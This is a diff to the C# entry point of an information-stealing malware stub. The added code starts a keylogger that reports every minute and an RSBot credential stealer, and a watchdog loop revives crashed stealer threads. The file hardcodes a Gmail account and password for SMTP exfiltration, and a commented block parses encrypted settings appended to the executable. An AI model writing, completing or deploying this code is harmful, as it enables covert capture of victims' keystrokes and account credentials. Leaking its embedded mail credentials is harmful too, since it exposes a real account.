@@ -1,47 +1,62 @@
 ﻿using System;
+using System.Collections;
 using System.IO;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
 using sub.Stealers;
 using sub.Util.Encryption;
+using sub.Util.Misc;
 
 namespace sub
 {
-    class Program
+    internal class Program
     {
-        static void Main()
+        private static void Main()
         {
-            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
-            //filedata|split|appendData
-            string appendData = Encoding.ASCII.GetString(stub).Split(new string[] { Settings.Splitter }, StringSplitOptions.None)[1];
-
-            //keyPart1|lilsplit|encryptedSettings|lilsplit|keyPart2
-            string[] firstCycle = appendData.Split(new string[] {Settings.LittleSplitter}, StringSplitOptions.None);
-            string key = firstCycle[0] + firstCycle[2];
-            string encryptedSettings = firstCycle[1];
-            SimpleAES decryptor = new SimpleAES(key);
-            string[] decryptedSettings = decryptor.DecryptString(encryptedSettings).Split(new string[] { Settings.LittleSplitter }, StringSplitOptions.None);
             /*
+                SettingsParser parser = new SettingsParser(Application.ExecutablePath);
+                string[] decryptedSettings = parser.GetSettings();
                 Settings.EmailAddress = decryptedSettings[0];
                 Settings.EmailPassword = "decryptedSettings[1];
                 Settings.SmtpAddress = decryptedSettings[2];
                 Settings.SmtpPort = decryptedSettings[3];
              */
-            //There needs to be code here that parses the settings into
-            //These fields, but for now here is some test data
             Settings.EmailAddress = "sexmongrel69@gmail.com";
             Settings.EmailPassword = "omglawls";
             Settings.SmtpAddress = "smtp.gmail.com";
             Settings.SmtpPort = 587;
 
             Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
+            
+            StealerThread logger = new StealerThread(new Keylogger(), 1);    
+            logger.Start(); //Starts a Keylogger that reports every 1 minute
+            
 
-            StealerThread logger = new StealerThread(new Keylogger());    
-            logger.Start(1); //Starts a Keylogger that reports every 1 minute
+            StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
+            rsbot.Start();
 
-            StealerThread rsbot = new StealerThread(new RSBotStealer());
-            logger.Start(-1);
+            while (true)
+            {
+                //Implement some kind of checking to make sure none of the threads crashed
+                //Restart them if they did (unless they are meant to run once)
+                foreach(StealerThread st in Variables.stealerPool)
+                {
+                    if (st.GetDelay() <= 0) continue; //If it is meant to run once, don't revive
+                    if(st.GetStealerThread().ThreadState != ThreadState.Running
+                        && st.GetStealerThread().ThreadState != ThreadState.WaitSleepJoin)
+                    {
+                        st.Start();
+                    }
+                    if(st.GetReporterThread().ThreadState != ThreadState.Running
+                        && st.GetReporterThread().ThreadState != ThreadState.WaitSleepJoin)
+                    {
+                        st.Start();
+                    }
+                }
+                Thread.Sleep(1000); //Sleep the main thread so the stub doesn't close
+            }
         }
     }
 }
